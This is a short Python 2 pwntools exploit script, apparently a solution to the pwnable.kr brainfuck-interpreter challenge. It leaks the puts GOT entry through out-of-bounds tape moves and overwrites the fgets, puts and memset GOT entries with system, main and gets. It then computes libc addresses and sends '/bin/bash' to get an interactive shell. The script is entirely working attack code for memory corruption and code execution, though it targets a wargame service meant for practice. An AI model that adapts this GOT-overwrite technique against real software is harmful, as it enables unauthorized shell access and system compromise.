from pwn import *

main = 0x08048700
system_off = 0x03ADA0
gets_off = 0x05F3E0
puts = (0x05FCA0, 0x18)

t = remote('pwnable.kr', 9001)

print t.recvuntil(" [ ]\n")
payload = '<' * (0xA0 - puts[1] - 3) + '.<.<.<.'  # leak
payload += '<' * 8 + ',>,>,>,'  # override fgets
payload += '>' * 5 + ',>,>,>,'  # override puts
payload += '>' * 17 + ',>,>,>,'  # override memset
payload += '['  # trigger gets

t.sendline(payload)
puts_leak = packing.u32(t.recvn(4), endian='big')  # puts leak

libc_offset = puts_leak - puts[0]
system_addr = libc_offset + system_off
gets_addr = libc_offset + gets_off

t.send(packing.p32(system_addr))
t.send(packing.p32(main))
t.send(packing.p32(gets_addr))
t.sendline('/bin/bash')

print hex(libc_offset)
print hex(puts_leak)
print hex(gets_addr)
print hex(system_addr)

t.interactive()
